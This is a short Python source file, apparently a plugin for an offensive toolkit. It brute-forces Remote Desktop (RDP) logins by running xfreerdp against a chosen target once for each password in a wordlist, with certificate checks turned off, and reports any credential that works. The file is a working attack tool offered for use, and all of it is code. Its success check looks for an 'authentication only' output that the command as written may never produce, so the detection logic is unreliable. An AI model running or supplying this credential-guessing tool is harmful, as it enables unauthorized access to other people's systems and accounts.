from core.plugin_base import PluginBase
import subprocess

class RDPBrutePlugin(PluginBase):
    @property
    def name(self): return "RDP Brute"
    @property
    def description(self): return "Attempts to brute-force RDP credentials using xfreerdp/rdesktop or native methods."

    def run(self, target, user="Administrator", wordlist="rockyou.txt", **kwargs):
        if not wordlist or not target:
            return "Target and wordlist required."
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            for password in passwords:
                cmd = [
                    "xfreerdp",
                    f"/v:{target}",
                    f"/u:{user}",
                    f"/p:{password}",
                    "/cert-ignore", "/w:800", "/h:600"
                ]
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if "Authentication only, exit status 0" in proc.stdout:
                    return f"Success: {user}@{target}:{password}"
            return "No valid credentials found."
        except Exception as e:
            return f"Error: {e}"

def get_plugin(): return RDPBrutePlugin()
# plugins/rdp_brute.py
# plugins/rdp_brute.py